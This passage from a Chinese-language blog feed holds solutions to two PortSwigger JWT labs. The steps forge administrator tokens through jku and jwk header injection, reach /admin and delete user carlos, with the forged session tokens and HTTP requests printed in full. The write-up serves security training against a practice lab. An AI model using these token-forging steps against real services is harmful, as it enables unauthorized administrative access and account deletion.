session=eyJraWQiOiJhZjk1NTUxZi03NDQ0LTQ5OTktYWE1Ni0yYjc1NzUyNzFlYzQiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vZXhwbG9pdC0wYTAyMDAxYzAzMmY3NTAwODMxMDYzOTAwMTVmMDA0Zi5leHBsb2l0LXNlcnZlci5uZXQvZXhwbG9pdCJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTM5NDk4NCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.nmXUBDXuQffDQRn8EJXv1CT3Mq4_EVQ3VIXcaLsdURISlXT7IdMu_onsOLi0Sd0ysKzVUOJcct5yEq6PaMCpcJx0nDbSxFJIAf3362INmgWl_mz9wMsGkymzXsmb47rz08Z-wo7q5qF0sH1s0OZ-e-mkQDIZPjBayCnaWeDLoPbjE-59Pjh94gWuF2HmomBZbAvxyNel_R9OHd69UkkI0J0FXDSPI3Xtwd1xQmfICzEZJ49LuAGYCAHviz5sIRrOCsOd49TTDvN8vHBxgUOG0EZ_6rCohK7VjEvb09YKvfEa43tWPCRzkpJ8FiY9-8JEJ-XyOSt6iMdrFhIPBmykUg HTTP/2 200 OK &amp;lt;div&amp;gt; &amp;lt;span&amp;gt;carlos - &amp;lt;/span&amp;gt; &amp;lt;a href=&amp;#34;/admin/delete?username=carlos&amp;#34;&amp;gt;Delete&amp;lt;/a&amp;gt; &amp;lt;/div&amp;gt; 修改url为/admin/delete?username=carlos后再次发送请求即可解题 GET /admin/delete?username=carlos HTTP/2 Cookie: session=eyJraWQiOiJhZjk1NTUxZi03NDQ0LTQ5OTktYWE1Ni0yYjc1NzUyNzFlYzQiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vZXhwbG9pdC0wYTAyMDAxYzAzMmY3NTAwODMxMDYzOTAwMTVmMDA0Zi5leHBsb2l0LXNlcnZlci5uZXQvZXhwbG9pdCJ9.</description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-weak-signing-key-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>点击右上角&lt;code>My account&lt;/code>并使用&lt;code>wiener:peter&lt;/code>登录&lt;/li>
&lt;li>登录后跳转至个人页面，请求如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /my-account?id=wiener &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=eyJraWQiOiI1NzlmOGIxYi00YjNhLTQwZGUtODBmOC0zNGQ0ZjY4YzIyY2UiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTM4OTI1Mywic3ViIjoid2llbmVyIn0.V9Mwe_ylgCnRybT7TGTVZcEetuEbS3sI7t_86J7nTTz52YotdrcyQEBUchbLFksYIvRipTV9lYiF_64XVKtCJ-1nwU4_KyvjIa5JI5EyC_qAypLl-lDY5sGEzn1F75-jKN8RWMWsl68yI_jkCGpY36DZmifl6wgv9d0OMvu1tGxLLHodpJZxGzuRLR8-TbRCSJe3j-2NIFHcZsDSbnIXx1x7QSftT40v8cf__gcRAZME1XiyMAw3i9r7_6hNSCl4bxVD6lrirQ4zVE07Bw0K1PUrGMNRAmGRLcY5vp_ThFJCH-vn8fDZTjKMptEYOiPLXTLXSbKqxjbLhpf1WdJ62w&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>通过&lt;a href="https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd">JWT Editor&lt;/a>生成一对新的RSA密钥对，点击&lt;code>JWT Editor&lt;/code>、&lt;code>New RSA key&lt;/code>
&lt;img alt="New RSA key" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-jku-header-injection-2.jpg">&lt;/li>
&lt;li>复制&lt;code>RSA key&lt;/code>内容如下
&lt;img alt="Copy Public key as JWK" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-jku-header-injection-3.jpg">
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-json" data-lang="json">&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;kty&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;RSA&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;e&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;AQAB&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;kid&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;af95551f-7444-4999-aa56-2b7575271ec4&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;n&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;oYon4kO8dQ_k9plM5huvUJDiEARxbI1nUKRIwfoB_lkenj2luei0K8aUxhxqZnGpAHJtIscyNmeJyLh-HPdcdfRPvy3Dvsu4dSiv0jCfnCtid2gI5ckFXmchbaTwuvadDHJOJ03VFC4zCH7cANZZJcgnr9IoGuiT8oFs_eO4BwSG6zAFTKn4ZL3kaa-hPZd-ygw2W85m_C0Jc5GZ-RaPaqsK3uAlNcQaQZr2AxWbp9wXotvxrdV4lUO5QKNAqldV7NLwfLmCThsb9GWBXVWQCg9YrkGSwRTWCUm-ZMgk2IvETetVU-aaGGzZBI_cgKOJdtzbLvBhIrIorRvbvSSFhw&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>点击上方&lt;code>Go to exploit server&lt;/code>，将Body部分的内容替换为如下的空JWK集合，并将步骤4的复制内容贴入&lt;code>keys&lt;/code>中，并点击&lt;code>Store&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-json" data-lang="json">&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;keys&amp;#34;&lt;/span>: [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;img alt="New RSA key" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-jku-header-injection-4.jpg">&lt;/li>
&lt;li>将步骤2请求发送至Burp Repeater，点击&lt;code>JSON Web Token&lt;/code>
&lt;img alt="JSON Web Token" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-jku-header-injection-5.jpg">&lt;/li>
&lt;li>更新&lt;code>JWT header&lt;/code>中的的&lt;code>kid&lt;/code>为步骤4的&lt;code>kid&lt;/code>，并新增&lt;code>jku&lt;/code>字段为exploit server url，更新&lt;code>JWT body&lt;/code>中的&lt;code>sub&lt;/code>为&lt;code>administrator&lt;/code>
&lt;img alt="JSON Web Token" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-jku-header-injection-6.jpg">&lt;/li>
&lt;li>点击&lt;code>Sign&lt;/code>，确保选中&lt;code>Don't modify header&lt;/code>选项，点击&lt;code>ok&lt;/code>
&lt;img alt="Sign" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-jku-header-injection-7.jpg">&lt;/li>
&lt;li>将url修改为&lt;code>/admin&lt;/code>并发送请求
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=eyJraWQiOiJhZjk1NTUxZi03NDQ0LTQ5OTktYWE1Ni0yYjc1NzUyNzFlYzQiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vZXhwbG9pdC0wYTAyMDAxYzAzMmY3NTAwODMxMDYzOTAwMTVmMDA0Zi5leHBsb2l0LXNlcnZlci5uZXQvZXhwbG9pdCJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTM5NDk4NCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.nmXUBDXuQffDQRn8EJXv1CT3Mq4_EVQ3VIXcaLsdURISlXT7IdMu_onsOLi0Sd0ysKzVUOJcct5yEq6PaMCpcJx0nDbSxFJIAf3362INmgWl_mz9wMsGkymzXsmb47rz08Z-wo7q5qF0sH1s0OZ-e-mkQDIZPjBayCnaWeDLoPbjE-59Pjh94gWuF2HmomBZbAvxyNel_R9OHd69UkkI0J0FXDSPI3Xtwd1xQmfICzEZJ49LuAGYCAHviz5sIRrOCsOd49TTDvN8vHBxgUOG0EZ_6rCohK7VjEvb09YKvfEa43tWPCRzkpJ8FiY9-8JEJ-XyOSt6iMdrFhIPBmykUg&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;div&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;span&amp;gt;carlos - &amp;lt;/span&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;a href=&amp;#34;/admin/delete?username=carlos&amp;#34;&amp;gt;Delete&amp;lt;/a&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/div&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>修改url为&lt;code>/admin/delete?username=carlos&lt;/code>后再次发送请求即可解题
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin/delete?username=carlos &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=eyJraWQiOiJhZjk1NTUxZi03NDQ0LTQ5OTktYWE1Ni0yYjc1NzUyNzFlYzQiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vZXhwbG9pdC0wYTAyMDAxYzAzMmY3NTAwODMxMDYzOTAwMTVmMDA0Zi5leHBsb2l0LXNlcnZlci5uZXQvZXhwbG9pdCJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTM5NDk4NCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.nmXUBDXuQffDQRn8EJXv1CT3Mq4_EVQ3VIXcaLsdURISlXT7IdMu_onsOLi0Sd0ysKzVUOJcct5yEq6PaMCpcJx0nDbSxFJIAf3362INmgWl_mz9wMsGkymzXsmb47rz08Z-wo7q5qF0sH1s0OZ-e-mkQDIZPjBayCnaWeDLoPbjE-59Pjh94gWuF2HmomBZbAvxyNel_R9OHd69UkkI0J0FXDSPI3Xtwd1xQmfICzEZJ49LuAGYCAHviz5sIRrOCsOd49TTDvN8vHBxgUOG0EZ_6rCohK7VjEvb09YKvfEa43tWPCRzkpJ8FiY9-8JEJ-XyOSt6iMdrFhIPBmykUg&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol></content></item><item><title>Lab: JWT authentication bypass via jwk header injection</title><link>/portswigger-posts/jwt-lab-jwt-authentication-bypass-via-jwk-header-injection/</link><pubDate>Fri, 27 Dec 2024 23:40:23 +0800</pubDate><guid>/portswigger-posts/jwt-lab-jwt-authentication-bypass-via-jwk-header-injection/</guid><description>Lab description Solution 点击右上角My account并使用wiener:peter登录 登录后跳转至个人页面，请求如下 GET /my-account?id=wiener HTTP/2 Cookie: session=eyJraWQiOiI2YTAzNmViNC1iOThmLTRmMWUtYmNhMS1iNjQ3YjYwMmVhMzQiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTMxODc2Mywic3ViIjoid2llbmVyIn0.QFZHCuPIeQOqOsCVjDSqbqiVDBunwQYEIZOTS8AnqF_A4JpCjL7V77MQeulXTSJXQVK41yOS2XVMDQsc9pCYC1bx6Wv35NjgNC4xoKJaqUjv0hbaxtYwaoDIiLWXP_5kwxYf2SBGgMZZXarIsw6p_JNQgeRKw3NwopuhQo1dm55_FJCppCJ2UfNs-gjhjUIQJNpMbk3jHfTCJtLGt6kofSR3qp1VCaPoDxSS9goF-13sipq7ttvz8Lyuc2uiKoniHaBF8OespKMkP0HYRxg8HURUvwmxt1C2lwvb6lz4QIBzbyGFaJZvpH2sPPUmzYW4Vy5qbfDThBp3L6rM_klrPw 通过JWT Editor生成一对新的RSA密钥对，点击JWT Editor、New RSA key 将步骤2的请求发送至Burp Repeater，并点击JSON Web Token分页 将JWT payload中的sub从wiener修改为administrator 点击下方Attack、Embedded JWK，并选择步骤4所新增的RSA密钥对 在JWT header中已添加了一个包含新增公钥的jwk参数 发送修改JWT后的请求，并修改url为/admin GET /admin HTTP/2 Cookie: session=eyJraWQiOiI5ZWE0ODhhYi04MGU0LTQ2NjgtYjAyZC0zZDBhOTllYmFlY2YiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsImtpZCI6IjllYTQ4OGFiLTgwZTQtNDY2OC1iMDJkLTNkMGE5OWViYWVjZiIsIm4iOiJ1S0dlbXlVMkZPb190ZXljUnphYkoyTWhUbkVJRDdFVWJoX2ZvdURyRU14S2ZnQzFfRV9ka3BqZ0FpbzFzMXV3QjBLaWx5ck0zTEg5cUQ0R2hLczVvUHQzb3V1VTVBamJ1bi1TTG1Xd0F5cXV6U2ZvZU5JSW5HR2JFeXU3ZENucGpRb3NJMXhEbHF3b1pQQVV3S3FidGh3NDZDcm54SmpBR1Vmcl90RzdnNFl3X3M1RC1zNmJBU3NxU0dKZWFVeXQ0UTF4WXV0VnN0RzdfNEVDQ0hXZF9jMTVIdDhVekk3VE5EaWsxUTkxREk2SF9wcVg1VGlRZmVYaXJXdGd6U2s1VXVPYU1TTjZCTFM4dmtaWUhrRnB5TktKSWNwZEpmcnMwMzVYQ0xuUE5MbXkzM2FQTElmeVJhVFdPc0s3a2pmOGVrWS1LcUJKQkVmcWlCSDBMZE5vVVEifX0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTMxODc2Mywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.uJx5uzr5ehWN22wY8AmWV8Rb5ZP1yZxyYXrRFPBb2rCd-rVnXKvARF9d6BbyOb9xADVCnxyEK5P5I5F5MP5qL_rioisbnzezckGs32XyeR2_0NRTB76iZnhYw7zBnLbyHFKUGqGycKvsnKmxG5cUVTdE-2buLUTThxOjgaM1B0keKL2Crw6woqNaeX1d2QSLRVX-i9NHyDj_UMCoOiKkL35LAoTiBV4-JUH90IFBrYvzTm21mPl3tROiwxEb7POyUZVC7IWQ08LaH8XgCyQwB14XSCnwnHuqzLS2QG1-U5TPkhCYthFVXteyEm4TiYF0PDSampFAsYcLibq2veda2A HTTP/2 200 OK &amp;lt;div&amp;gt; &amp;lt;span&amp;gt;carlos - &amp;lt;/span&amp;gt; &amp;lt;a href=&amp;#34;/admin/delete?username=carlos&amp;#34;&amp;gt;Delete&amp;lt;/a&amp;gt; &amp;lt;/div&amp;gt; 修改上述请求url为/admin/delete?username=carlos并且再次发送请求，即可解题 GET /admin/delete?username=carlos HTTP/2 Cookie: session=eyJraWQiOiI5ZWE0ODhhYi04MGU0LTQ2NjgtYjAyZC0zZDBhOTllYmFlY2YiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsImtpZCI6IjllYTQ4OGFiLTgwZTQtNDY2OC1iMDJkLTNkMGE5OWViYWVjZiIsIm4iOiJ1S0dlbXlVMkZPb190ZXljUnphYkoyTWhUbkVJRDdFVWJoX2ZvdURyRU14S2ZnQzFfRV9ka3BqZ0FpbzFzMXV3QjBLaWx5ck0zTEg5cUQ0R2hLczVvUHQzb3V1VTVBamJ1bi1TTG1Xd0F5cXV6U2ZvZU5JSW5HR2JFeXU3ZENucGpRb3NJMXhEbHF3b1pQQVV3S3FidGh3NDZDcm54SmpBR1Vmcl90RzdnNFl3X3M1RC1zNmJBU3NxU0dKZWFVeXQ0UTF4WXV0VnN0RzdfNEVDQ0hXZF9jMTVIdDhVekk3VE5EaWsxUTkxREk2SF9wcVg1VGlRZmVYaXJXdGd6U2s1VXVPYU1TTjZCTFM4dmtaWUhrRnB5TktKSWNwZEpmcnMwMzVYQ0xuUE5MbXkzM2FQTElmeVJhVFdPc0s3a2pmOGVrWS1LcUJKQkVmcWlCSDBMZE5vVVEifX0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTMxODc2Mywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.uJx5uzr5ehWN22wY8AmWV8Rb5ZP1yZxyYXrRFPBb2rCd-rVnXKvARF9d6BbyOb9xADVCnxyEK5P5I5F5MP5qL_rioisbnzezckGs32XyeR2_0NRTB76iZnhYw7zBnLbyHFKUGqGycKvsnKmxG5cUVTdE-2buLUTThxOjgaM1B0keKL2Crw6woqNaeX1d2QSLRVX-i9NHyDj_UMCoOiKkL35LAoTiBV4-JUH90IFBrYvzTm21mPl3tROiwxEb7POyUZVC7IWQ08LaH8XgCyQwB14XSCnwnHuqzLS2QG1-U5TPkhCYthFVXteyEm4TiYF0PDSampFAsYcLibq2veda2A HTTP/2 302 Found</description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-jwk-header-injection-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>点击右上角&lt;code>My account&lt;/code>并使用&lt;code>wiener:peter&lt;/code>登录&lt;/li>
&lt;li>登录后跳转至个人页面，请求如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /my-account?id=wiener &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=eyJraWQiOiI2YTAzNmViNC1iOThmLTRmMWUtYmNhMS1iNjQ3YjYwMmVhMzQiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTMxODc2Mywic3ViIjoid2llbmVyIn0.QFZHCuPIeQOqOsCVjDSqbqiVDBunwQYEIZOTS8AnqF_A4JpCjL7V77MQeulXTSJXQVK41yOS2XVMDQsc9pCYC1bx6Wv35NjgNC4xoKJaqUjv0hbaxtYwaoDIiLWXP_5kwxYf2SBGgMZZXarIsw6p_JNQgeRKw3NwopuhQo1dm55_FJCppCJ2UfNs-gjhjUIQJNpMbk3jHfTCJtLGt6kofSR3qp1VCaPoDxSS9goF-13sipq7ttvz8Lyuc2uiKoniHaBF8OespKMkP0HYRxg8HURUvwmxt1C2lwvb6lz4QIBzbyGFaJZvpH2sPPUmzYW4Vy5qbfDThBp3L6rM_klrPw&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>通过&lt;a href="https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd">JWT Editor&lt;/a>生成一对新的RSA密钥对，点击&lt;code>JWT Editor&lt;/code>、&lt;code>New RSA key&lt;/code>
&lt;img alt="New RSA key" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-jwk-header-injection-2.jpg">
&lt;img alt="New RSA key" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-jwk-header-injection-3.jpg">&lt;/li>
&lt;li>将步骤2的请求发送至Burp Repeater，并点击JSON Web Token分页
&lt;img alt="JSON Web Token" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-jwk-header-injection-4.jpg">&lt;/li>
&lt;li>将&lt;code>JWT payload&lt;/code>中的&lt;code>sub&lt;/code>从&lt;code>wiener&lt;/code>修改为&lt;code>administrator&lt;/code>
&lt;img alt="JSON Web Token" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-jwk-header-injection-5.jpg">&lt;/li>
&lt;li>点击下方&lt;code>Attack&lt;/code>、&lt;code>Embedded JWK&lt;/code>，并选择步骤4所新增的RSA密钥对
&lt;img alt="Embedded JWK" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-jwk-header-injection-6.jpg">&lt;/li>
&lt;li>在&lt;code>JWT header&lt;/code>中已添加了一个包含新增公钥的jwk参数
&lt;img alt="Embedded JWK" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-jwk-header-injection-7.jpg">&lt;/li>
&lt;li>发送修改JWT后的请求，并修改url为&lt;code>/admin&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=eyJraWQiOiI5ZWE0ODhhYi04MGU0LTQ2NjgtYjAyZC0zZDBhOTllYmFlY2YiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsImtpZCI6IjllYTQ4OGFiLTgwZTQtNDY2OC1iMDJkLTNkMGE5OWViYWVjZiIsIm4iOiJ1S0dlbXlVMkZPb190ZXljUnphYkoyTWhUbkVJRDdFVWJoX2ZvdURyRU14S2ZnQzFfRV9ka3BqZ0FpbzFzMXV3QjBLaWx5ck0zTEg5cUQ0R2hLczVvUHQzb3V1VTVBamJ1bi1TTG1Xd0F5cXV6U2ZvZU5JSW5HR2JFeXU3ZENucGpRb3NJMXhEbHF3b1pQQVV3S3FidGh3NDZDcm54SmpBR1Vmcl90RzdnNFl3X3M1RC1zNmJBU3NxU0dKZWFVeXQ0UTF4WXV0VnN0RzdfNEVDQ0hXZF9jMTVIdDhVekk3VE5EaWsxUTkxREk2SF9wcVg1VGlRZmVYaXJXdGd6U2s1VXVPYU1TTjZCTFM4dmtaWUhrRnB5TktKSWNwZEpmcnMwMzVYQ0xuUE5MbXkzM2FQTElmeVJhVFdPc0s3a2pmOGVrWS1LcUJKQkVmcWlCSDBMZE5vVVEifX0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTMxODc2Mywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.uJx5uzr5ehWN22wY8AmWV8Rb5ZP1yZxyYXrRFPBb2rCd-rVnXKvARF9d6BbyOb9xADVCnxyEK5P5I5F5MP5qL_rioisbnzezckGs32XyeR2_0NRTB76iZnhYw7zBnLbyHFKUGqGycKvsnKmxG5cUVTdE-2buLUTThxOjgaM1B0keKL2Crw6woqNaeX1d2QSLRVX-i9NHyDj_UMCoOiKkL35LAoTiBV4-JUH90IFBrYvzTm21mPl3tROiwxEb7POyUZVC7IWQ08LaH8XgCyQwB14XSCnwnHuqzLS2QG1-U5TPkhCYthFVXteyEm4TiYF0PDSampFAsYcLibq2veda2A&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;div&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;span&amp;gt;carlos - &amp;lt;/span&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;a href=&amp;#34;/admin/delete?username=carlos&amp;#34;&amp;gt;Delete&amp;lt;/a&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/div&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>修改上述请求url为&lt;code>/admin/delete?username=carlos&lt;/code>并且再次发送请求，即可解题
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin/delete?username=carlos &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=eyJraWQiOiI5ZWE0ODhhYi04MGU0LTQ2NjgtYjAyZC0zZDBhOTllYmFlY2YiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsImtpZCI6IjllYTQ4OGFiLTgwZTQtNDY2OC1iMDJkLTNkMGE5OWViYWVjZiIsIm4iOiJ1S0dlbXlVMkZPb190ZXljUnphYkoyTWhUbkVJRDdFVWJoX2ZvdURyRU14S2ZnQzFfRV9ka3BqZ0FpbzFzMXV3QjBLaWx5ck0zTEg5cUQ0R2hLczVvUHQzb3V1VTVBamJ1bi1TTG1Xd0F5cXV6U2ZvZU5JSW5HR2JFeXU3ZENucGpRb3NJMXhEbHF3b1pQQVV3S3FidGh3NDZDcm54SmpBR1Vmcl90RzdnNFl3X3M1RC1zNmJBU3NxU0dKZWFVeXQ0UTF4WXV0VnN0RzdfNEVDQ0hXZF9jMTVIdDhVekk3VE5EaWsxUTkxREk2SF9wcVg1VGlRZmVYaXJXdGd6U2s1VXVPYU1TTjZCTFM4dmtaWUhrRnB5TktKSWNwZEpmcnMwMzVYQ0xuUE5MbXkzM2FQTElmeVJhVFdPc0s3a2pmOGVrWS1L